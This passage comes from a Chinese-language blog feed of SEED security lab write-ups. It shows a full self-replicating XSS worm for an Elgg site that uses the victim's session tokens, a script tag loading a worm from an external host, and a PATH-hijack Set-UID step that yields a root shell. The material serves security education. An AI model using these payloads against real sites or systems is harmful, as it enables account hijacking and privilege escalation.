class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;http://www.example70.com/xssworm.js&quot;</span>&gt;&lt;/script&gt; <br></code></pre></td></tr></table></figure></li><li><p>以boby的身份登录，在没有点进samy主页之前：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127193618552.png"></p><p>点进之后：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127193652857.png" alt="image-20241127193652857"></p></li><li><p>而以charlie的身份访问boby，也会被攻击：</p><p>before：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127193913149.png" alt="image-20241127193913149"></p><p>访问boby之后：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127193945832.png" alt="image-20241127193945832"></p></li></ol><p><strong>说明蠕虫攻击成功了！</strong></p><hr><h5 id="DOM-Approach"><a href="#DOM-Approach" class="headerlink" title="DOM Approach"></a>DOM Approach</h5><ol><li><p>将samy的profile中的恶意代码修改如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> id=<span class="hljs-string">&quot;worm&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>;<br>    <span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);<br>    <br>    <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br>    <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br>    <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br>    <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br><br>    <span class="hljs-keyword">var</span> content=token + ts + userName + <span class="hljs-string">&quot;&amp;description=This is from samy&quot;</span> + wormCode + <span class="hljs-string">&quot;&amp;accesslevel[description]=2&quot;</span> + guid;<br>    <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>;<br>    <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br><br>    <span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid)<br>    &#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>        <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127194838924.png" alt="image-20241127194838924"></p></li><li><p>alice的简介清除之后，访问samy主页，攻击成功：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127194933254.png" alt="image-20241127194933254"></p></li><li><p>boby的简介清除之后，访问alice主页，也可以攻击成功：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127195031026.png" alt="image-20241127195031026"></p></li></ol><p><strong>说明蠕虫攻击再次实现了！</strong></p><hr><h4 id="Task-7-Defeating-XSS-Attacks-Using-CSP"><a href="#Task-7-Defeating-XSS-Attacks-Using-CSP" class="headerlink" title="Task 7: Defeating XSS Attacks Using CSP"></a>Task 7: Defeating XSS Attacks Using CSP</h4><ol><li><p>原始状态</p><p><a href="http://www.example32a.com/">www.example32a.com</a>: 全都OK，弹窗也可执行：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127195745135.png" alt="image-20241127195745135"></p><p><a href="http://www.example32b.com/">www.example32b.com</a>: 4 6 OK，1 2 3 5 7 Failed，弹窗不可执行：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127195844243.png" alt="image-20241127195844243"></p><p><a href="http://www.example32c.com/">www.example32c.com</a>: 1 4 6 OK，2 3 5 7 Failed，弹窗不可执行：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127195947547.png" alt="image-20241127195947547"></p></li><li><p>修改<code>/etc/apache2/sites-available/apache_csp.conf</code>，将<a href="http://www.example32b.com中的*.example60.com添加上去：">www.example32b.com中的*.example60.com添加上去：</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127200524687.png" alt="image-20241127200524687"></p></li><li><p><code>service apache2 restart</code>重启apache后，可以看到<a href="http://www.example32b.com的5/">www.example32b.com的5</a> OK了，说明csp将<a href="http://www.example60.com添加进白名单了：">www.example60.com添加进白名单了：</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127201552820.png" alt="image-20241127201552820"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127200813339.png" alt="image-20241127200813339"></p></li><li><p>修改<code>var/www/csp/phpindex.php</code>文件，添加’nonce-222-222-222’ *.example60.com：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127201447359.png" alt="image-20241127201447359"></p></li><li><p><code>service apache2 restart</code>重启apache后，可以看到<a href="http://www.example32c.com的5/">www.example32c.com的5</a> OK了，说明csp将<a href="http://www.example60.com/">www.example60.com</a> 和 ‘nonce-222-222-222’ 添加进白名单了：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127201552820.png" alt="image-20241127201552820"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127201720614.png" alt="image-20241127201720614"></p></li></ol><p>由此可见，csp为白名单制度，将对应的站点添加进白名单后，就能正确访问。</p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 6</title>
    <link href="/2024/12/25/lab6/"/>
    <url>/2024/12/25/lab6/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-6-环境变量与set-uid实验"><a href="#Lab-6-环境变量与set-uid实验" class="headerlink" title="Lab 6-环境变量与set-uid实验"></a>Lab 6-环境变量与set-uid实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>本实验的学习目标是让学生了解环境变量如何影响程序以及系统行为。环境变量是一组动态命名值，可以影响正在运行的进程将在计算机上运行。大多数操作系统都使用它们，因为它们是1979年引入Unix。尽管环境变量会影响程序行为，但它们是如何实现的这一点很多程序员都不太理解。因此，如果程序使用环境变量程序员不知道它们被使用，程序可能有漏洞。</p><p>在本实验中，学生将了解环境变量是如何工作的，它们是如何从父进程到子进程，以及它们如何影响系统&#x2F;程序行为。我们特别感兴趣的是如何环境变量影响Set-UID程序的行为，这些程序通常是特权程序。</p><p>本实验涵盖以下主题：</p><ul><li>环境变量</li><li>SET-UID程序</li><li>安全地调用外部程序</li><li>能力泄漏</li><li>动态加载程序&#x2F;链接器</li></ul><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="Task-1-Manipulating-Environment-Variables"><a href="#Task-1-Manipulating-Environment-Variables" class="headerlink" title="Task 1: Manipulating Environment Variables"></a>Task 1: Manipulating Environment Variables</h4><ol><li><p>输出环境变量，使用env命令：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124013314720.png" alt="image-20241124013314720"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124013346597.png" alt="image-20241124013346597"></p></li><li><p>输出特定的环境变量：</p><ul><li><p>printenv PWD<img src="https://gitee.com/r0otsu/images/raw/master/image-20241124013436244.png" alt="image-20241124013436244"></p></li><li><p>env | grep PWD</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124013617488.png" alt="image-20241124013617488"></p></li></ul></li><li><p>删除环境变量，使用unset命令</p><p>使用unset删除PWD，再使用printenv输出PWD，发现为空：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124014012189.png" alt="image-20241124014012189"></p></li><li><p>设置环境变量，使用export命令</p><p>使用export设置PWD，再使用printenv输出PWD，可以得到：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124014159317.png" alt="image-20241124014159317"></p></li></ol><hr><h4 id="Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="Task 2: Passing Environment Variables from Parent Process to Child Process"></a>Task 2: Passing Environment Variables from Parent Process to Child Process</h4><ol><li><p><code>man fork</code><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124014905021.png" alt="image-20241124014905021"></p><p>查看fork()函数的功能：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124014833518.png" alt="image-20241124014833518"></p></li></ol><hr><h5 id="Step-1-输出子进程的环境变量"><a href="#Step-1-输出子进程的环境变量" class="headerlink" title="Step 1. 输出子进程的环境变量"></a>Step 1. 输出子进程的环境变量</h5><ol><li><p>编辑<code>task2.c</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124015343856.png" alt="image-20241124015343856"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124015323788.png" alt="image-20241124015323788"></p></li><li><p>编译，存入<code>child.txt</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124015629901.png" alt="image-20241124015629901"></p></li><li><p>输出</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124015553446.png" alt="image-20241124015553446"></p></li></ol><hr><h5 id="Step-2-输出父进程的环境变量"><a href="#Step-2-输出父进程的环境变量" class="headerlink" title="Step 2. 输出父进程的环境变量"></a>Step 2. 输出父进程的环境变量</h5><ol><li><p>编辑<code>task2.c</code>文件，将子进程的printenv()注释掉，父进程添加printenv()：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124020112445.png" alt="image-20241124020112445"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124020054624.png" alt="image-20241124020054624"></p></li><li><p>重新编译<code>task2.c</code>并执行<code>task2</code>，将结果保存到<code>parent.txt</code>中：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124020253446.png" alt="image-20241124020253446"></p></li></ol><hr><h5 id="Step-3-父-子进程环境变量的区别"><a href="#Step-3-父-子进程环境变量的区别" class="headerlink" title="Step 3. 父&#x2F;子进程环境变量的区别"></a>Step 3. 父&#x2F;子进程环境变量的区别</h5><ol><li><p>使用diff进行父&#x2F;子进程环境变量的对比：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124020407911.png" alt="image-20241124020407911"></p><p>没有输出，说明两次程序输出的环境变量完全相同，使用fork()函数创建的子进程的环境变量继承了父进程全部的环境变量。</p></li></ol><hr><h4 id="Task-3-Environment-Variables-and-execve"><a href="#Task-3-Environment-Variables-and-execve" class="headerlink" title="Task 3: Environment Variables and execve()"></a>Task 3: Environment Variables and execve()</h4><ol><li><p>man execve：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124020641522.png" alt="image-20241124020641522"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124020625137.png" alt="image-20241124020625137"></p></li></ol><hr><h5 id="Step-1-编译并运行示例代码"><a href="#Step-1-编译并运行示例代码" class="headerlink" title="Step 1. 编译并运行示例代码"></a>Step 1. 编译并运行示例代码</h5><ol><li><p>创建<code>task3.c</code>文件，代码如下：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124020931247.png" alt="image-20241124020931247"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124020802191.png" alt="image-20241124020802191"></p></li><li><p>输出为空</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124020913290.png" alt="image-20241124020913290"></p></li></ol><hr><h5 id="Step-2-修改函数参数"><a href="#Step-2-修改函数参数" class="headerlink" title="Step 2. 修改函数参数"></a>Step 2. 修改函数参数</h5><ol><li><p>修改</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124125210092.png" alt="image-20241124125210092"></p></li><li><p>编译</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124021428746.png" alt="image-20241124021428746"></p></li><li><p>得到了当前进程的环境变量</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124125443240.png" alt="image-20241124125443240"></p></li></ol><hr><h5 id="Step-3-结论"><a href="#Step-3-结论" class="headerlink" title="Step 3. 结论"></a>Step 3. 结论</h5><p>将exevce()函数的第三个参数由NULL改为environ，就能够输出当前进程的环境变量。</p><p>所以原进程的环境变量，是通过将environ变量传入exceve()函数的第三个参数，从而实现环境变量的传递。</p><hr><h4 id="Task-4-Environment-Variables-and-system"><a href="#Task-4-Environment-Variables-and-system" class="headerlink" title="Task 4: Environment Variables and system()"></a>Task 4: Environment Variables and system()</h4><p>通过system()函数执行新程序，探究环境变量的变化</p><ol><li><p><code>man system</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124130059318.png" alt="image-20241124130059318"></p></li><li><p>创建task4.c</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124130157257.png" alt="image-20241124130157257"></p></li><li><p>编译并运行得到当前进程的环境变量</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124130311167.png" alt="image-20241124130311167"></p></li></ol><hr><h4 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and Set-UID Programs</h4><p>探究环境变量是否由Set-UID程序的进程从用户的进程中继承</p><p>Set-UID程序：指所有执行该程序时以root权限执行。</p><ol><li><p>创建<code>task5.c</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124130933853.png" alt="image-20241124130933853"></p></li></ol><hr><h5 id="Step-1-编译运行示例代码，打印当前进程的所有环境变量"><a href="#Step-1-编译运行示例代码，打印当前进程的所有环境变量" class="headerlink" title="Step 1. 编译运行示例代码，打印当前进程的所有环境变量"></a>Step 1. 编译运行示例代码，打印当前进程的所有环境变量</h5><ol><li><p>编译后运行，得到该进程所有的环境变量</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124131049938.png" alt="image-20241124131049938"></p></li></ol><hr><h5 id="Step-2-更改所有权为root，使其成为一个Set-UID程序"><a href="#Step-2-更改所有权为root，使其成为一个Set-UID程序" class="headerlink" title="Step 2. 更改所有权为root，使其成为一个Set-UID程序"></a>Step 2. 更改所有权为root，使其成为一个Set-UID程序</h5><ol><li><p>将所有权更改为Root账户，使用chown命令；</p><p>使用chmod命令，即可成为Set-UID程序：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124132623421.png" alt="image-20241124132623421"></p></li><li><p>将<code>task5</code>与<code>task4</code>的属性进行对比，可以发现已经得到了一个Set-UID程序：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124183556157.png" alt="image-20241124183556157"></p></li></ol><hr><h5 id="Step-3-在普通用户Shell中设置环境变量并运行Set-UID程序"><a href="#Step-3-在普通用户Shell中设置环境变量并运行Set-UID程序" class="headerlink" title="Step 3. 在普通用户Shell中设置环境变量并运行Set-UID程序"></a>Step 3. 在普通用户Shell中设置环境变量并运行Set-UID程序</h5><ol><li><p>设置环境变量PATH：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124184113704.png" alt="image-20241124184113704"></p></li><li><p>设置环境变量LD_LIBRARY_PATH：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124184154466.png" alt="image-20241124184154466"></p></li><li><p>设置环境变量name：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124184224932.png" alt="image-20241124184224932"></p></li><li><p>运行Set-UID程序<code>task5</code>，输出当前的环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124184338207.png" alt="image-20241124184338207"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124184429107.png" alt="image-20241124184429107"></p><p>可以看到PATH和name环境变量，但是看不到LD_LIBRARY_PATH；</p><p><strong>原理：</strong><code>LD_LIBRARY_PATH</code>是在查找指定动态链接库时，除了默认路径以外的其他路径。若其可以被修改，就可能加载攻击者的恶意库，所以为了使Set-UID程序更加安全，运行时的加载器会忽略此环境变量。</p></li></ol><hr><h4 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and Set-UID Programs"></a>Task 6: The PATH Environment Variable and Set-UID Programs</h4><ol><li><p>先把改成&#x2F;bin&#x2F;zsh</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124215308898.png" alt="image-20241124215308898"></p></li><li><p>创建<code>task6.c</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124215228627.png" alt="image-20241124215228627"></p></li><li><p>添加&#x2F;bin&#x2F;seed加入环境变量PATH：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124215353145.png" alt="image-20241124215353145"></p></li><li><p>使用chown和chmod命令，将<code>task6</code>设置为Set-UID程序：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124215422404.png" alt="image-20241124215422404"></p></li><li><p>编译运行<code>task6</code>文件，即运行<code>ls</code>命令：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124215500795.png" alt="image-20241124215500795"></p></li><li><p>修改环境变量，使得system调用shell执行自己设定的程序，即创建一个名为<code>ls</code>的可执行文件，执行时，shell自定义：</p><p>创建<code>hello.c</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124215534594.png" alt="image-20241124215534594"></p></li><li><p>编译得到为<code>ls</code>的可执行文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124215738395.png" alt="image-20241124215738395"></p></li><li><p>将当前可执行文件<code>ls</code>的路径加入PATH环境变量中：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124215807755.png" alt="image-20241124215807755"></p></li><li><p>执行<code>task6</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124215827878.png" alt="image-20241124215827878"></p><p>得到了<code>Hello world!</code></p><p>也就是说，虽然shell中执行的是<code>ls</code>命令，但执行了自己设定的可执行文件中的命令。</p></li><li><p>将&#x2F;bin&#x2F;sh程序复制到&#x2F;tmp目录中，重命名为ls</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124220045550.png" alt="image-20241124220045550"></p></li><li><p>将&#x2F;tmp加入PATH环境变量，先使用&#x2F;tmp中的sh</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124220155737.png" alt="image-20241124220155737"></p></li><li><p>运行<code>task6</code>后，即使以普通用户身份，也能得到root权限</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124220353059.png" alt="image-20241124220353059"></p></li></ol><hr><h4 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h4><h5 id="Step-1-构建一个动态链接库"><a href="#Step-1-构建一个动态链接库" class="headerlink" title="Step 1. 构建一个动态链接库"></a>Step 1. 构建一个动态链接库</h5><ol><li><p>创建<code>mylib.c</code>文件，并编译</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124221525685.png" alt="image-20241124221525685"></p></li><li><p>设置LD_PRELOAD环境变量</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124221601835.png" alt="image-20241124221601835"></p></li><li><p>创建<code>myprog.c</code>文件，并编译</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241124221659147.png" alt="image-20241124221659147"></p></li></ol><hr><h5 id="Step-2-四个不同场景中运行myprog可执行文件"><a href="#Step-2-四个不同场景中运行myprog可执行文件" class="headerlink" title="Step 2. 四个不同场景中运行myprog可执行文件"></a>Step 2. 四个不同场景中运行myprog可执行文件</h5><h6 id="场景一：普通用户"><a href="#场景一：普通用户" class="headerlink" title="场景一：普通用户"></a>场景一：普通用户</h6><ol><li>正常打印<img src="https://gitee.com/r0otsu/images/raw/master/image-20241124221751576.png" alt="image-20241124221751576"></li></ol><h6 id="场景二：将myprog设置为Set-UID根程序，普通用户执行"><a href="#场景二：将myprog设置为Set-UID根程序，普通用户执行" class="headerlink" title="场景二：将myprog设置为Set-UID根程序，普通用户执行"></a>场景二：将myprog设置为Set-UID根程序，普通用户执行</h6><ol><li>sleep1秒后退出<img src="https://gitee.com/r0otsu/images/raw/master/image-20241124221836977.png" alt="image-20241124221836977"></li></ol><h6 id="场景三：将myprog设置为Set-UID根程序，并在root下设置LD-PRELOAD环境变量后"><a href="#场景三：将myprog设置为Set-UID根程序，并在root下设置LD-PRELOAD环境变量后" class="headerlink" title="场景三：将myprog设置为Set-UID根程序，并在root下设置LD_PRELOAD环境变量后"></a>场景三：将myprog设置为Set-UID根程序，并在root下设置LD_PRELOAD环境变量后</h6><ol><li><p>若为root：正常打印<img src="https://gitee.com/r0otsu/images/raw/master/image-20241124222023429.png" alt="image-20241124222023429"></p></li><li><p>若为普通用户：sleep1秒后退出<img src="https://gitee.com/r0otsu/images/raw/master/image-20241124222104896.png" alt="image-20241124222104896"></p></li></ol><h6 id="场景四：将myprog设置为Set-UID-user1程序，并在seed用户下设置环境变量"><a href="#场景四：将myprog设置为Set-UID-user1程序，并在seed用户下设置环境变量" class="headerlink" title="场景四：将myprog设置为Set-UID user1程序，并在seed用户下设置环境变量"></a>场景四：将myprog设置为Set-UID user1程序，并在seed用户下设置环境变量</h6><ol><li><p>创建新用户user1：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241124222152118.png" alt="image-20241124222152118"></p></li><li><p>在seed下运行myprog：</p><p>设置myprog以及环境变量<img src="https://gitee.com/r0otsu/images/raw/master/image-20241124222224313.png" alt="image-20241124222224313"></p><p>执行后发现sleep1秒后退出：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241124222313260.png" alt="image-20241124222313260"></p></li></ol><hr><h5 id="Step-3-设计实验"><a href="#Step-3-设计实验" class="headerlink" title="Step 3. 设计实验"></a>Step 3. 设计实验</h5><p><strong>猜测：</strong>myprog会从用户进程中继承环境变量，但是由于动态链接器的保护机制，并不会继承LD_PRELOAD环境变量。</p><p><strong>设计思路：</strong>在上述四种场景中，打印出用户进程和子进程的环境变量，关注其LD_PRELOAD环境变量的不同。</p><h6 id="场景一：普通用户-1"><a href="#场景一：普通用户-1" class="headerlink" title="场景一：普通用户"></a>场景一：普通用户</h6><ol><li><p>设置LD_PRELOAD环境变量为自己的动态链接库</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125084602477.png" alt="image-20241125084602477"></p></li><li><p>编辑<code>task7.c</code>文件，打印子进程的环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125084450237.png" alt="image-20241125084450237"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125084012232.png" alt="image-20241125084012232"></p></li><li><p>编译后执行，并将输出存为<code>child_seed.txt</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125085113484.png" alt="image-20241125085113484"></p></li><li><p>编辑<code>task7.c</code>文件，打印父进程的环境变量</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125084327806.png" alt="image-20241125084327806"></p></li><li><p>编译后执行，并将输出存为<code>parent_seed.txt</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125085302330.png" alt="image-20241125085302330"></p></li><li><p>发现两个输出文件没有差别：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125085336281.png" alt="image-20241125085336281"></p></li><li><p>并且可以发现二者输出的环境变量中都有LD_PRELOAD环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125085557712.png" alt="image-20241125085557712"></p></li></ol><p><strong>说明：</strong>子进程继承了用户进程的LD_PRELOAD环境变量。</p><hr><h6 id="场景二：将task7设置为Set-UID根程序，普通用户执行"><a href="#场景二：将task7设置为Set-UID根程序，普通用户执行" class="headerlink" title="场景二：将task7设置为Set-UID根程序，普通用户执行"></a>场景二：将task7设置为Set-UID根程序，普通用户执行</h6><ol><li><p>task7设置为Set-UID根程序：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125090651975.png" alt="image-20241125090651975"></p></li><li><p>编辑<code>task7.c</code>，为输出子进程环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125090714775.png" alt="image-20241125090714775"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125090004250.png" alt="image-20241125090004250"></p></li><li><p>编译后，得到<code>task7</code>可执行文件，并将其设置为Set_UID程序</p><p>将其执行后存为<code>child_seed_set_uid.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125090814819.png" alt="image-20241125090814819"></p></li><li><p>编辑<code>task7.c</code>，为输出父进程环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125091135964.png" alt="image-20241125091135964"></p></li><li><p>编译后执行，不将执行文件设置为Set_UID程序，并将输出文件存为<code>parent_seed.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125091325334.png" alt="image-20241125091325334"></p></li><li><p>发现只有父进程中有LD_PRELOAD环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125091526911.png" alt="image-20241125091526911"></p></li></ol><p>说明：对比后发现，两个输出文件有差别，即子进程没有继承父进程中的环境变量。</p><hr><h6 id="场景三：将task7设置为Set-UID根程序，并在root下设置LD-PRELOAD环境变量后"><a href="#场景三：将task7设置为Set-UID根程序，并在root下设置LD-PRELOAD环境变量后" class="headerlink" title="场景三：将task7设置为Set-UID根程序，并在root下设置LD_PRELOAD环境变量后"></a>场景三：将task7设置为Set-UID根程序，并在root下设置LD_PRELOAD环境变量后</h6><p><strong>在root下：</strong></p><ol><li><p>root下设置环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125092142299.png" alt="image-20241125092142299"></p></li><li><p>设置为输出子进程环境变量，并将可执行文件设置为Set_UID程序</p><p>将输出存为<code>child_root.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125092235502.png" alt="image-20241125092235502"></p></li><li><p>设置为输出父进程环境变量</p><p>将输出存为<code>parent_root.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125092350997.png" alt="image-20241125092350997"></p></li><li><p>对比发现两个输出文件没有差别：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125092418229.png" alt="image-20241125092418229"></p></li></ol><p><strong>说明：</strong>发现此时二者的环境变量一致，二者都有LD_PRELOAD环境变量。</p><p><strong>在普通用户下</strong>：</p><ol><li><p>设置root环境变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125093153160.png" alt="image-20241125093153160"></p></li><li><p>普通用户下，输出子进程，并设置为Set_UID程序，输出存为<code>child_root_set_uid.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125093831214.png" alt="image-20241125093831214"></p></li><li><p>普通用户下，输出父进程，输出存为<code>parent_root_2.txt</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241125093943122.png" 